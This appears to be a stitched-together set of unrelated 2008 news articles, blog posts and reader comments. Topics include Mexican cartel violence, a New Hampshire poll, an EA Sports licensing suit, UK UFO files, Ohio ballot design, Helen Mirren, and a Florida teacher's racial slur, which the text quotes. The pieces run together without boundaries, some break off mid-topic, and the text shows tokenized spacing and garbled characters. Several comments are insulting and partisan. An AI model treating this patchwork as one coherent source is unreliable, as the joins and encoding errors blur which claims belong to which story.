Already , purported thugs from La Familia have been demanding payoffs from merchants in Ixtapan de la Sal to avoid having their businesses torched or their personnel attacked , according to local media accounts .
“ Precisely because [ Vergara ] refused to have any contact whatsoever with people involved in the distribution of drugs , this attack occurred , ” said Alberto Bazbaz , attorney general for the state of Mexico .
More than 3,000 people have been killed across the nation this year as the government battles drug trafficking organizations and the gangs , at the same time , fight among themselves over territory and smuggling routes .
The government of President Felipe Calderon launched a major crackdown on the drug organizations nearly two years ago , but violence has only intensified .
The vast majority of the dead have been traffickers and members of government security forces ; rarely has a sitting elected official been targeted .
The killing of Vergara may also have been intended as a message to Enrique Peña Nieto , the charismatic , high - profile governor of the state of Mexico and likely presidential candidate for the Institutional Revolutionary Party , or PRI .
Vergara belonged to Peña Nieto ’s inner circle and had been tapped to run for a seat in the national Congress next year .
The mayor ’s slaying sent spasms of panic through the state ’s political leadership , with a dozen or so mayors saying they too had received death threats and were in dire need of protection .
( One of them reportedly said he had already confessed to his priest to prepare for death . )
Peña Nieto , serving as a pallbearer at Vergara ’s funeral Sunday , pledged a blindaje , or security shield , for the officials .
But several mayors were grousing Tuesday that they had received no additional protection .
“ We will soon know what Enrique Peña Nieto is made of , ” commentator Francisco Garfias wrote in the Excelsior newspaper .
“ He has the opportunity to show that he ’s got what it takes to aspire to the Big One in 2012 , ” the year of the next presidential election .
“ The challenge is immense . ”
Ixtapan de la Sal , about 55 miles southwest of Mexico City , is a popular resort known for its thermal springs and spas and a major getaway attraction for the residents of this sprawling capital .
A month ago , 24 bodies were found at another popular tourist spot outside Mexico City , the La Marquesa park .
Most of the victims were bound and had been shot in the head .
Principal transit point
German Garciamoreno Avila , head of the State Security Agency , said Ixtapan de la Sal had emerged in recent months as a principal transit point for drugs coming from the state of Guerrero to Mexico City .
It was that development that emboldened the traffickers and cost Vergara his life , Garciamoreno told the online version of El Universal newspaper Tuesday .
For many Mexicans , the killing of a mayor was one more drop in the lake , as the expression goes .
After so many slayings -- the number this year already has surpassed that of all of last year -- the distinctions between who the victims are have become blurred .
In a public opinion survey this week , Mexicans overwhelmingly listed drug trafficking and violence as the greatest threats to the nation .
“ They will kill anyone who disturbs them , who refuses to collaborate with them , who threatens them , ” Sergio Aguayo , an analyst at the Colegio de Mexico , said of the drug gangs .
“ The significance [ of the mayor ’s slaying ] is that they have decided to respond to the government ’s war on them with more war , and they are determined to continue . ”

CONCORD , N.H. - Barack Obama has vaulted to a 15 - point lead over John McCain in New Hampshire , according to a new Boston Globe poll , a significant gap in a state that McCain considers his second political home and has long been a swing state in the race for the White House .
Financial distress has clearly driven voters from McCain to Obama , who was trailing his Republican rival by 2 percentage points in Septembe - a 17 - point swing in just one month .
Nearly half of those surveyed cited the economy and jobs as their top concerns , and they overwhelmingly saw Obama as the candidate best equipped to address them .
" McCain certainly has his back to the wall in New Hampshire , " said Andrew Smith , director of the University of New Hampshire Survey Center , which conducted the poll .
" The economic crisis in September and October has changed the mood of voters in New Hampshire , who are now solidly backing Obama as the candidate best able to deal with economic issues . "
The poll also found that the Arizona senator is being dragged down by a deeply troubled Bush administration , an increasingly unpopular running mate , Sarah Palin , and the perceived negativity of his campaign .
Three - quarters of those surveyed said Obama has the best chance to win , which Smith said could depress turnout for McCain .
Obama 's edge in New Hampshire is fresh evidence that the state is shedding its identity as the last refuge for Yankee conservatives .
The survey of 725 likely voters , conducted from Oct. 18 to Oct. 22 , had Obama leading 54 to 39 percent , with 6 percent undecided and a sampling error of plus or minus 3.5 percentage points .
In a sign of how all - important the economy has become in this election , Obama has seized a commanding lead even though voters saw McCain as better able to take on terrorism , nuclear proliferation , and Iraq .
When it came to who would be better at handling the economy and the financial system , the Illinois senator trounced his rival .
Harry Nelson , a 79 - year - old retired Wall Street money manager who participated in the poll and agreed to speak with a reporter afterward , said the next president will enter the White House under conditions similar to those that faced Franklin D. Roosevelt in 1933 .
Obama , he said , has " some of the same stuff " as Roosevelt and could be a " transformational leader . "
" If you look at the way he runs his campaign , it 's been brilliant , " said Nelson , an undeclared voter who lives in Hanover .
" I do n't think he's an economic expert , but he does n't have to be - he picks good people .
. . .
That 's what management is all about , is n't it ? "
Most voters - 66 percent - considered McCain the more experienced of the two candidates .
But , in a sign that McCain has failed to cast himself as a reformer and to dissociate himself from Bush , twice as many respondents said Obama was the candidate most likely to bring change .
EA Sports makes what can only be described as mountains of money from the Madden NFL series .
An update is released for every console platform on a yearly basis , and the title continually sells in the millions .
Now retired NFL players are coming forward with lawsuits claiming EA is n't giving them the money they deserve for the use of their likeness and career information , and according to some damning internal communication , it appears as if the the NFL Players Association intentionally brokered a lower - than - market - value deal for retired players as a favor to the gaming giant .
How important is it for EA to have this information ?
" We do n't believe there is a market for interactive football that is not based on real players and teams , " lawyer Stuart M. Paynter told Ars about a lawsuit that claimed EA had an monopoly on electronic football .
That lawsuit claimed that by signing deals with the NFL , the players union , Arena Football , and NCAA football , any competitor is effectively locked out by using any likeness of any player or team , current or past .
This more recent lawsuit , Parrish , Adderley et al v. NFL Players , Inc. , may show that some of those deals were n't competitive , and that both sides of the negotiation process were working towards an EA monopoly .
Jeff Nixon , who played safety for the Buffalo Bills from 1979 to 1984 , has written an open letter ( via GamePolitics ) to John Madden detailing the corruption inside the NFLPA and Players Inc. , the groups responsible for the negotiation for player compensation from EA Sports .
NFLPA executive Clay Walker basically lays out the favoritism in this internal e-mail .
" I was able to forge this deal with the [ Hall of Fame ] that provides them with 400 K per year ( which is significantly below market rate ) in exchange for the HOF player rights .
EA owes me a huge favor because of that threat was enough to persuade Take Two to back off its plans , leaving EA as the only professional football videogame manufacturer out there . "
How Walker expected to be repaid for these alleged activities in unknown .
An e-mail sent November 1 , 2007 , is equally plain in its language .
Andrew Feffer , executive vice president and chief operating officer of the NFLPA wrote to EA Sports ' representative Paul Cairns that " Clay and Joe 's negotiation of these discounted terms was a significant contribution to EA as you more than likely would have paid in excess of $ 1 million for these rights without their involvement and assistance . "
In other words , you saved a cool million because you had people negotiating who were n't hoping to strike the best deal for the players .
The lawsuit claims the NFLPA worked for EA , not the players
Walker sent another e-mail to a Players Inc. attorney that shows they snubbed a larger offer from Take Two to make sure EA nabbed the rights at below - market prices , allowing them to lock down professional football .
" The per player price for most of these guys was tens of thousands of dollars less than what they were guaranteed by Take Two Interactive so it ’s a real coup that we were able to pull this off so cheaply , " he wrote .
" You have to remember that EA 's total cost is only $ 200,000 per year .
We know that Take Two offered six - figure deals to several former NFL players , so the total cost is millions below market prices . "
Why would the organizations who supposedly support the players sell them out so easily ?
Jeff Nixon claims the answer is simple : " Discovery information also shows that the NFLPA and Players Inc. unilaterally made a decision to take $ 8 million dollars of the gross licensing revenue that should have been shared with retired players and reallocate it to the administration of the NFLPA and Players Inc. " he wrote .
" Even though the NFLPA and Players Inc. said they would subsequently conduct an independent third - party appraisal to assess the appropriateness of their decision , they have conceded that no such appraisal ever occurred . "
The communications and bookkeeping that have been made available during the discovery phase of the lawsuit seem damning to the NFLPA .
While the defendants will no doubt put up a spirited defense , EA can rest easy : the company has years to go before it has to renegotiate any aspect of this sweetheart deal .
With many retired players receiving a pittance in benefits compared to those who played during the eras of fat TV contracts and free agency while suffering from permanent physical damage from the game , these allegations are even more disgusting .
Everyone seems to be profiting from the blood and sweat of the players who make the game great — except the people who actually wore the numbers and uniforms depicted in the game .
LONDON , England ( CNN ) --
Thousands of documents about reported UFO sightings -- ranging from calm accounts by professional pilots to unhinged rants about the extraterrestrial menace -- have been released by the British Ministry of Defence .
Taiwan resident Lee Chun-hung took these pictures showing a ball of fire trailing across the sky .
The 4,500 pages cover sightings that were reported from 1986 through 1992 .
The British military released them to a curious public as part of a four - year project to transfer all such documents to the National Archives .
One highlight from the batch released Monday involves the captain of an Italian airliner .
He shouted " Look out ! " to his co-pilot in April 1991 after claiming to see a beige " missile - shaped object " shoot past the cockpit .
In that instance , the defence ministry ruled out a missile and " all the usual explanations , " wrote David Clarke , a UFO expert and journalism instructor at Sheffield Hallam University , who worked with the National Archives to prepare the new materials for release .
" The end result was this was a genuine UFO and the file was simply closed , " he wrote .
" There was nothing more they could do . "
The newly released documents also carry an account by a U.S. Air Force pilot who says he was told to shoot down an unidentified flying craft over eastern England .
But before he could fire , the object disappeared .
Do n't Miss Secret UFO files released by UK government
The next day , a man arrived to debrief the pilot and " he was told in no uncertain terms that what he had seen on his radar was top secret and he was n't to speak about it to anyone , " Clarke wrote .
The first set of files was made available to members of the public in May .
It covered reported UFO sightings from 1978 to 1987 , and included hundreds of police reports taken from witnesses who described seeing lights or strange objects in the sky .
People who reported having seen UFOs typically describe various shapes and colors of lights , moving in formation or hovering in the sky .
Witnesses reported orange , red , white and green lights that were diamond - shaped , square , or cigar - shaped .
They reported them to police , who have a standard 16 - question form specifically for UFO sightings .
" The vast majority of them are just ordinary people who 've seen something unusual and thought that they ought to tell someone about it , " Clarke has said .
The Ministry of Defence said it examined the reports solely to determine whether enemy aircraft had infiltrated British airspace .
Once it was determined that no enemy aircraft were in the sky , it did not investigate further .
" The Ministry of Defence has no other interest or role regarding UFO matters and does not consider questions regarding the existence or otherwise of extraterrestrial life - forms , " it said in May .
That left many incidents unexplained .
If I had unlimited frequent - flyer miles , I definitely would not have missed last night 's Royal Aeronautical Society lecture by Dr. Ian Poll , Professor of Aerospace Engineering at Cranfield University and head of the Omega Project , an effort to develop more eco-friendly aviation .
The Times of London has a curtain - raiser on the lecture , which is supposed to call for converting more aviation from fossil fuels to nuclear power .
“ We need to be looking for a solution to aviation emissions which will allow flying to continue in perpetuity with zero impact on the environment , " Professor Poll tells the paper .
“ We need a design which is not kerosene - powered , and I think nuclear - powered aeroplanes are the answer beyond 2050 .
The idea was proved 50 years ago , but
I accept it would take about 30 years to persuade the public of the need to fly on them . ”
Professor
Poll said the big challenge would be to demonstrate that passengers and crew could be safely shielded from the reactors .
* “ It 's done on nuclear submarines and could be achieved on aircraft by locating the reactors with the engines out on the wings , ” he said .
* “ The risk of reactors cracking open in a crash could be reduced by jettisoning them before impact and bringing them down with parachutes . ” *
Now , I would n't want to have a reactor sailing down on me , whether it is attached to a parachute or not .
But I guess it beats getting hit by frozen lavatory waste .
Actually , the idea is not that far - out .
The Air Force and the old Atomic Energy Commission spent billions during the Cold War to develop nuclear - powered aircraft .
While a plane never successfully flew under nuclear power , a converted B - 36 bomber carried a reactor in dozens of test flights in the 1950s .
Seriously .

The first evidence that millions of tons of a greenhouse gas 20 times more potent than carbon dioxide is being released into the atmosphere from beneath the Arctic seabed has been discovered by scientists .
The Independent has been passed details of preliminary findings suggesting that massive deposits of sub -sea methane are bubbling to the surface as the Arctic region becomes warmer and its ice retreats .
Underground stores of methane are important because scientists believe their sudden release has in the past been responsible for rapid increases in global temperatures , dramatic changes to the climate , and even the mass extinction of species .
Scientists aboard a research ship that has sailed the entire length of Russia 's northern coast have discovered intense concentrations of methane â€ “ sometimes at up to 100 times background levels â€ “ over several areas covering thousands of square miles of the Siberian continental shelf .

Horrible design , and I 'm sure Ohio knows it .
All designs for forms / ballots need to cater to the lowest common denominator .
This design could cause a lot of confusion for people in all walks of life .
Ohio has a large senior citizen population , and I know this ballot will confuse some of them .
Thanks , Brad , for all you do .

I really do n't see the confusion here .
" For President and Vice - President Please Vote for One ( 1 ) "
If you can't figure that out , you probably are n't a person who is going to show up to vote on election day anyway .
And if you do somehow figure out how to turn the knob to open your front door and end up at your polling place , you probably already have a candidate 's name written on the back of your hand to help you know which bubble to fill in when you get there .

There is a cardinal rule in design : THE USER IS NEVER WRONG .
If there is an easy way for a user to make a mistake , they WILL .
And if they can , the design should be improved so it is harder .
This is stupid design .
On the PLUS side ( and believe me , given how much theft is going to be done by Rethuglicans across this country this November ) most of the people who would support Paul and / or the Constitution Party are probably going to also vote for McCain / Palin , so as far as I 'm concerned , let those votes be SPOILED , just as 35 K
Gore votes were spoiled in Florida in 2000 and 150K Kerry votes were spoiled in Ohio in 2004 .
At this point , in a war to the death with Turdblossom and his ilk , I 'll take whatever little breaks come our way .

Mal design of ballots is endemic wherever the forces of weevil have influence .

If people can't figure this ballot out , then they can't see or read .
If they can't see or read , they need to vote some other way besides on a ballot of any type .
To everyone else , I think this will be obvious .
Honestly , you 'd have to be quite mentally challenged to not be able to figure out that column 2 is a continuation of 1 .
How many voters will this confuse ?
My guess is , not many .

I know us Buckeyes might not be considered the smartest in the land but I 've already voted and did n't have , nor did I see other appearing to have , any obvious problems with the ballot .
Most of the seniors I know have long ago decided who they intend to vote for and that will be the only name they will be searching for on the ballot .
And if the concern is for lost votes due to seniors confusion please remember that the strongest support for Sen.
McCain is among seniors , so if they get confused and the result is a spoiled ballot then I guess that 's just the way it is .
Would I be upset if it cost Sen. Obama the election ?
Sure I would , but I would n't have much sympathy if it were the Republicans who finally had an election stolen from them .

One of the problems is that the names of the candidates do n't remain the same - in some precincts , McCain may be at the top , and in others , Obama may be at the top .
Or wherever .
Names are constantly switched around , because it 's been proven that people often vote for the first name on the list without reading .
Yeah , I know , that 's stupid .
This will only happen on paper ballots , however .
You cannot overvote on machines , you can only undervote .
The machine is not supposed to let you vote for more than one if that is called for .
But I urge folks in Ohio to vote absentee and if you are waiting until election day to vote , ASK for a paper ballot .
Election workers are not allowed by a directive from the Sec. of State to inform voters they have a choice of paper or machine .
Which I disagree with , as an election judge .

This might have been true in the past , but not the case for Ohio in Nov. Election workers are REQUIRED by a directive from the Sec. of State to inform voters they have a choice of paper or machine by POSTING MANDATORY signage about paper ballots .
All precincts are required to have TWO LINES , one for paper and one for DRE voting .
All DRE county precincts are required to have enough paper ballots for 25 % of registered voters .

I was prepared to be shocked by an extremely confusing ballot ... where is the shock and confusion ?
How can you suggest that this format would benefit one party over another , unless you are suggesting that voters for a particular party are not smart enough to figure out something that appears to be simple enough .
Electronic voting machines would prevent disqualification for double - voting , but some do n't want electronic machines , so this is what you are stuck with .
If you want to be concerned about voter fraud in Ohio or anywhere , how about requiring actual PROOF of residency and identification ?

The mistake voters will make is NOT checking the bubble next to Obama / Biden and then voting for Nader or Barr in the write in box , but in mistakenly puting Obama / Biden in the write in box " to make sure . "
They think they are following instructions to " write in " the name of their choice .
They do n't realize they are voting twice for the same candidate , and that their ballot will be discarded !
This is just disgraceful .
And to say that such people are " stupid " is infuriating rubbish .
Probably some of the people reading this blog would have made the same mistake if they were rushed and in a hurry to get through with their ballot and perhaps confused by all the ballot initiatives ( which can be lengthy and contradictory --- and in fact are DESIGNED by scumbag political action committees to BE confusing ) .
It 's a favorite trick of Republicans to try and screw with the voting in every way they can !
In a straight honest vote in which every voter is heard they 'd lose every election !

I voted last night on this ballot in Columbus , Ohio and it is not a bad design .
It was easy to follow , the instructions that came with it are clear and easy to follow .
Anyone who has ever taken a standardized test or filled out any type of government document can complete this ballot easily .
It is long , lots of candidates and issues , but with early voting and the time you can take to complete the ballot I see no issues with this ballot .
OUR GREAT Secretary Of State , Jennifer Brunner has worked tirelessly to make Ohio's 2008 Voting Experience an much better one from 2004 and it is working .
We in OHIO are not uneducated idiots who cannot follow instructions .
I usually agree with this blog , value the work done to highlight people working against the LGBT Community , but this rant is uncalled for .

It could be worse , at least the columns are n't split so that Obama is on one column and McCain is on another column !
That would be a disaster .
Does n't anybody double - check the ballot design for flaws like this ?
It seems to me that ballot officials should have to show the ballot design to both Republican and Democratic party leaders in enough advance time , just so obvious things like this are caught early enough .

With real estate values plummeting and foreclosed homes sitting empty , a family of bobcats apparently decided the time was right to pounce .
So last week , they slipped out of the parched foothills of Lake Elsinore and into a spacious , vacant home in well - groomed Tuscany Hills .
Residents of the development got their first look Aug. 27 when the feline squatters -- at least two adults and three kittens -- lolled atop a wall outside the Spanish - style house .
Someone called 911 , reporting mountain lions .
Four police cruisers showed up and officers ordered everyone inside .
But soon they were out snapping photos along with the neighbors .
Bobcats are not known to attack humans , said Monique Middleton of Animal Friends of the Valley , which provides animal - control services .
“ But are they pussycats ?
No .
Can they do a lot of damage ?
Yes , ” she said .
“ They usually look for a food and water source , and there is an old koi pond in the backyard and that ’s where they are headed . ”
She said she expected the animals to move on in a few weeks , when the kittens are old enough to travel .
Tuscany Hills has been hit hard by foreclosures , and the house on Vista Palermo has been empty at least six months , neighbors said .
Said Scott Brown , who with his wife , Karen , moved here from Long Beach to be close to nature : “ They are great neighbors , and as long as they do n’t want to baby - sit my kids , it ’s not a problem . ”

If it ’s Monday , it ’s a SkyMall product review .
Gadling blogger Jeffrey
White shared his thoughts about SkyMall this past summer .
I must respectfully disagree with his opinion that SkyMall products are either useless crap or overpriced junk .
SkyMall products address the needs of the populace and , during these harsh economic times , is n’t that what we all need ?
This week we ’re talking about The Slanket .
Do n’t call it “ A ” Slanket .
Or just Slanket .
It ’s The Slanket .
And it ’s a blanket …with sleeves !
No longer will you be imprisoned underneath your blanket surrounded by snacks , beverages and gadgets that remain achingly outside your reach .
Now you ’ll be able to grab a fistful of pork rinds and your universal remote without exposing yourself to the perils of in - home frostbite .
So often I find myself sitting on my couch covered in a blanket and tzatziki sauce .
Why ?
Because my attempts to eat my delicious gyro while engulfed in the fleecy warmth of my blanket resulted in embarrassing yogurt - sauce stains .
Sure , I ’d love to eat over a plate but then my arms would be outside the blanket and I could catch a chill .
Should I wisely purchase The Slanket , I ’d finally be able to use my arms efficiently and warmly .
I mean , just take a look at the SkyMall product description :
Here ’s the best blanket – hands down – for snuggling up with a book or laptop computer .
Who does n’t love snuggling ?
And with The Slanket , you can quit that pesky habit of having to share your blanket with a loved one .
Because The Slanket is just for you and your computer .
And your beer .
And your internet girlfriend .
The Slanket .
Thank you , SkyMall .
And thank you to the genius who shot the photos for The Slanket ’s sadly hysterical website .
Well , what do you think of The Slanket ?

The Economy
The American financial system is the victim of decades of Republican deregulatory and anti-tax policies .
Those ideas have been proved wrong at an unfathomable price , but Mr. McCain  a self - proclaimed “ foot soldier in the Reagan revolution ”  is still a believer .
Mr. Obama sees that far - reaching reforms will be needed to protect Americans and American business .
Mr. McCain talks about reform a lot , but his vision is pinched .
His answer to any economic question is to eliminate pork - barrel spending  about $ 18 billion in a $ 3 trillion budget  cut taxes and wait for unfettered markets to solve the problem .
Mr. Obama is clear that the nation ’s tax structure must be changed to make it fairer .
That means the well - off Americans who have benefited disproportionately from Mr. Bush ’s tax cuts will have to pay some more .
Working Americans , who have seen their standard of living fall and their children ’s options narrow , will benefit .
Mr. Obama wants to raise the minimum wage and tie it to inflation , restore a climate in which workers are able to organize unions if they wish and expand educational opportunities .
Mr. McCain , who once opposed President Bush ’s tax cuts for the wealthy as fiscally irresponsible , now wants to make them permanent .
And while he talks about keeping taxes low for everyone , his proposed cuts would overwhelmingly benefit the top 1 percent of Americans while digging the country into a deeper fiscal hole .
National Security
The American military  its people and equipment  is dangerously overstretched .
Mr. Bush has neglected the necessary war in Afghanistan , which now threatens to spiral into defeat .
The unnecessary and staggeringly costly war in Iraq must be ended as quickly and responsibly as possible .
While Iraq ’s leaders insist on a swift drawdown of American troops and a deadline for the end of the occupation , Mr. McCain is still talking about some ill - defined “ victory . ”
As a result , he has offered no real plan for extracting American troops and limiting any further damage to Iraq and its neighbors .
Mr. Obama was an early and thoughtful opponent of the war in Iraq , and he has presented a military and diplomatic plan for withdrawing American forces .
Mr. Obama also has correctly warned that until the Pentagon starts pulling troops out of Iraq , there will not be enough troops to defeat the Taliban and Al Qaeda in Afghanistan .

Tens of thousands of Georgians were left homeless after the war Western donors have pledged $ 4.55 bn ( £ 2.7 bn ; 3.5bn euros ) to help rebuild Georgia , two months after its conflict with Russia .
The announcement followed a meeting of some 70 organisations and countries in Brussels , hosted by the European Commission and the World Bank .
EU officials said the amount was far more than had been expected .
In August , Moscow ousted Georgian troops from Georgia 's rebel regions of South Ossetia and Abkhazia .
EU External Relations Commissioner Benita Ferrero - Walder said the sum included $ 3.7bn of public money and $ 850 m from the private sector .
" I must tell you that it is much more than we have thought , and therefore I think it 's really a day of joy , " said Ms Ferrero - Walder .

She described the donations as an impressive sum , " especially in difficult times " .
Pledges from Western donors had expected to reach more than $ 3bn ( £ 1.8 bn ) .
Some key donors had announced their pledges prior to the meeting , with the US pledging $ 1bn ( £ 600 m ) and $ 700 m ( £ 429 m ) coming from the European Commission .
The remaining amount was expected to come from EU governments and international bodies like the World Bank .
Georgian Prime Minister Lado Gurgenidze said his country was " deeply moved and humbled by the demonstration of solidarity " from donors .
" At a time like this , to show such support is something that no Georgian will ever forget . "
Long - term need Russia withdrew its troops from the " buffer zones " earlier this month
At the opening of the conference , European Commission President Jose Manuel Barroso said there was a " moral imperative to help a neighbour in need " and that the European neighbourhood policy was " more than words , it 's about actions " .
He said that by helping Georgia , a key energy transit country , the EU was also helping itself .
The BBC's Oana Lungescu in Brussels said the conference was intended to send a strong signal of support and confidence in Georgia in its hour of need .
With winter approaching , the focus of the aid process is expected to be on resettling almost 65,000 refugees whose homes were burned and looted in the war , says our correspondent .
But much of the aid is for long - term needs , rebuilding infrastructure and restoring the confidence of foreign investors in Georgia 's once fast - growing economy .
Mr Gurgenidze said Georgia now had its " work cut out " to use the funds effectively .
" Our commitment to the taxpayers of all of the countries ... is that every single euro , every single dollar , pound , whatever other currency , will make Georgia stronger , more prosperous , freer , more democratic and more genuinely and thoroughly European , " he said .
Critics have warned of the damage that could be done by such a large influx of money .
Six Georgian opposition leaders sent an open letter to the conference urging donors to strictly monitor the funds allocation .
They said this would ensure that the money reached the displaced people and helped economic recovery , rather than strengthening the administration of President Mikhail Saakashvili , which they said had provoked Russia 's military intervention in August .
Russia still has more than 7,000 troops in South Ossetia and Abkhazia and was not invited to donors conference .
The Kremlin has drawn criticism from Western nations for recognising the two territories as independent states .
The conference supports Georgia 's territorial integrity and Russia has a different interpretation of that , one EU official explained .

What are these ?
In 2000 , Bush - Cheney stole the election , got us attacked , and then got us into two no - exit wars .
Four years later , white people reelected them .
Is not the repetition of the same behavior over and over again with the expectation of a different outcome the very definition of insanity ?
( It is , I looked it up . )
Dame Helen Mirren gave an interview to ex-newspaper editor Piers Morgan Oscar - winning actress Dame Helen Mirren has admitted that she used to " love " taking cocaine .
The actress , 63 , told GQ Magazine she used the Class A drug " just a little bit at parties " until the early 1980s .
She said she gave up the drug after learning that Nazi war criminal Klaus Barbie had been making money from the drug in South America .
That had revealed to her the " full horrifying structure of what brings coke to our parties " , she added .
She said : " I loved coke .
I never did a lot , just a little bit at parties . "
Dope always made me feel miserable and paranoid and unhappy
Dame Helen Mirren
She said that , after reading a newspaper article about Klaus Barbie , " all the cards fell into place and I saw how my little sniff of cocaine at a party had an absolute direct route " to him .
" And from that day I never touched cocaine again , " she added .
Dame Helen also told GQ she had used marijuana in the past .
" I hated it , " she said .
" Dope always made me feel miserable and paranoid and unhappy .
" And I woke up one day and thought , ' no more of that , thank you ' . "
Dame Helen has previously spoken about a bad experience she had after taking LSD in her early 20s .
Queen meeting
In her interview with former national newspaper editor Piers Morgan in the October edition of GQ , Dame Helen also spoke about being date - raped as a student - something she first revealed in a 2003 interview .
She told GQ : " I was [ date - raped ] , yes .
A couple of times .
" Not with excessive violence , or being hit , but rather being locked in a room and made to have sex against my will . "
Dame Helen said it was rape if a couple engaged in sexual activity but the woman said " no " at the last second .
She said ' hello , it 's lovely to meet you ' .
And that was about it , other than horsey chat
Dame Helen on meeting the Queen However , she said : " I do n't think she can have that man into court under those circumstances . "
She said she had not reported her own experiences to police because " you could n't do that in those days " .
Her comments were called " profoundly disappointing " by Home Office minister Tony McNulty .
" At a time when we 're trying to get more and more women to report rape , I find her comments very unhelpful and a matter of regret , " he told BBC Five Live .
Dame Helen , who won an Oscar last year for her role as the Queen , also revealed she finally met the monarch at Ascot this summer - after filming commitments meant she had to turn down an invitation for dinner at Buckingham Palace .
She said : " She said ' hello , it 's lovely to meet you ' .

What are these ?
Hal Hardenbegh has passed away ( in June , actually ) .
Link .
Who ?
Why , the author of the 80s newsletter DTACK Grounded .
What ?
DTACK Grounded was the rant forum for the smart , driven and idiosyncratic Hal Hardenbergh , who was on a mission to create the fastest 68000 machines ( and BASIC interpreter ) on the planet .
( DTACK is the signal from the memory system to the 68000 indicating “ Yup , you can complete that memory cycle now , ” and simply stapling it to ground means you ’ve built a system with as few memory waits as you can .
I recall the DTACK Grounded boards were insanely expensive because they used a metric boatload of static RAM , but they ran as fast as raped apes ) .
Hal ’s newsletter was interesting not only because of his outre ’ standards for performance , but also for his observations on the computing industry .
IIRC he hated Apple .
He somewhat liked the Atari ST , but was still critical of it .
He ranted against the x86 platform and was never short of advice for the industry .
My roommate and I always looked forward to the next issue of DTACK Grounded , and we were sad when Hal stopped publishing it .
We knew Hal was a lunatic , but he was a fun , expressive geek ’s lunatic , and despite his obsession with making a fast BASIC interpreter , pretty dead - on with his pithy observations .
I do n’t know if the newsletters are online anywhere , but if you can track ’em down , they ’re worth a read .
Florida teacher uses ' N ' word against Obama RAW STORY
Published : Friday October 3 , 2008
Print This Email
This A Florida middle school teacher faced disciplinary action after using the word " nigger " to describe Democratic presidential candidate Barack Obama , WJHG 's Kristy Wolski reported .
The 7th grade teacher , Greg Howard , asked his students what " change " stood for in relation to the Obama campaign and proceeded to write out the acronym " come help a nigger get elected . "
The school suspended Howard without pay for 10 days and removed him from his position at the school .
" That should n't happen , " said Billy Delahunt , an Obama supporter .
" Because they 're there to learn , they 're not there to discriminate . "
Jackson County 's Deputy School Superintendent confirmed that the teacher used the racial slur in class and that such actions would not be tolerated .
But school officials said Howard has been transferred to Jackson County Adult Education Program , where he will continue to teach .
Howard has also been removed from his position as football coach and may face further action from the Florida Department of Education .
This is not the first instance of racism in the presidential race .
A conservative convention in September included vendors selling " Obama Waffles " that featured a caricature of the candidate reminiscent of Aunt Jemima maple syrup .
During the Democratic primaries early this year , MSNBC analyst Keith Olbermann called an editorial by former Bush strategist Karl Rove attacking Obama " outright racist . "

IBM 's patent portfolio is a terrific source of the curious and bizarre .
From patents for " dealing with chaos , " to automating the process of informing a clerk whether you want paper or plastic , Big Blue certainly has a knack for wrapping its IP tendrils around some strange stuff .
This week , IBM is in the lawn sprinkler business .
US patent application 20080234870 , aka " Irrigation System and Methodology " is a lawn sprinkler system that cares as much about the weather as the guy engaging in awkward elevator conversations .
Alas , most modern sprinklers take only a passing fancy to the art of meteorology , claims IBM .
Simple systems are disposed to " unwarranted sprinkling , " wasting water by going to work at their pre-programmed schedules regardless if its raining or had rained earlier that day .
More modern systems may include a rain gauge to prevent sprinkling if it collects water prior to the programmed time .
But they can't tell if it begins raining soon after the sprinkling starts .
IBM submits a solution that involves a radio transmitter station that sends out weather prediction data to various geographic regions .
If some joker plans to do a rain dance that day , IBM 's special sprinklers are on the case .
" The irrigation apparatus also includes a controller , coupled to the radio receiver , that activates watering devices coupled to the controller to water at least one watering zone at a scheduled time .
However , the controller prevents activation of the watering devices at the scheduled time if at least one of the following conditions occurs .
A first condition is the radio receiver receiving the geographic sub-region code of the particular sub-region in which the irrigation apparatus is located , thus indicating that rain is forecast for the particular geographic sub-region within the first predetermined time period .
A second condition is the controller determining that rain water is present in a rain sensor coupled to the controller . "
[ Note that : " geographic sub-region code of the particular sub-region in which the irrigation apparatus is located , thus indicating that rain is forecast for the particular geographic sub-region within the predetermined time period , " is probably the best way ever to say " if it 's going to rain there " . ] ®
In politics , truth telling can be dangerous .
Remember when Jimmy Carter was voted out of office , in part , for telling the American people , in a time of high inflation and unemployment , what they did n’t want to hear  that they were self indulgent and consumed too much ?
Remember when Larry Lindsey , a top advisor to President George W. Bush , was fired for estimating the cost of the Iraq War to be $ 200 billion ?
( At the end of fiscal year 2008 , the war has cost $ 600 billion and the meter is running . )
This seemingly good - faith estimate contrasted with the preposterous administration line that the war would cost only $ 50 billion and that Iraqi oil revenues would pay for war reconstruction .
Remember when Eric Shinseki , the Army Chief of Staff , was pushed into retirement for testifying truthfully that occupying Iraq might prove to be a daunting challenge and could require several hundred thousand US combat troops ?
Recently , a couple of prominent figures have told the truth , but have not risked as much as these sacrificial lambs .
Israel ’s outgoing prime minister , Ehud Olmert , who has resigned to fight corruption charges , said what no Israeli prime minister has ever said .
He acknowledged that Israel must withdraw from nearly all the West Bank and give up East Jerusalem .
Any remaining land that Israel keeps on the West Bank would have to be compensated for by giving the Palestinians some of the Israeli land .
This sensible thinking is radical for an Israeli prime minister and essentially advocates throwing out long - standing Israeli defense doctrine .
Olmert also pooh - poohed the idea that Israel should bomb Iran over its alleged nuclear weapons program as " megalomania " and said that it was the problem of the international community .
The fact is that Olmert is now a lame duck , which leads to some valid skepticism about his new line .
Why did n’t he take this courageous stand when he could actually do something about the issue ?
His new forthrightness on the Israeli - Palestinian problem may be a cynical attempt to be remembered as being honest about something , given the personal corruption charges that he now faces in the Israeli courts .
Nevertheless , it probably helps to have an Israeli prime minister  lame duck or not  tell the truth about the situation .
Similarly , a US Secretary of Defense is also speaking out .
Coming after the lies his predecessor , Donald Rumsfeld , repeatedly told to justify propelling the United States into an invasion of Iraq and to cover up the ensuing bungling , Bob Gates ’s candor is refreshing  at least at first blush .
On the same day Olmert committed his honesty , while rendering the obligatory praise to the common soldier , Gates criticized the US military establishment for neglecting counterinsurgency warfare at the expense of buying new generations of technological warfighting gizmos .
As evidence , he noted that even with two wars going , the military had to be forced to produce systems to detect roadside bombs and field heavily armored troop transporters .
Like Olmert , Gates is nearing the end of his tenure and does n’t have much to lose by being honest .
In fact , if either the Democrat Barack Obama or the " maverick " Republican John McCain wins , he might be asked to stay on as Defense Secretary because of such straight shooting about Pentagon problems .
After all , Gates has presided over the US military " turning the situation around " in Iraq .
But if Gates were asked to remain on board in any new administration , he would be smart to decline the offer .
While Gates ’s comments were true , there is a limit to his honesty .
In fact , Gates has not so much turned around the situation in Iraq , as held the lid on until Bush can safely retire from office .
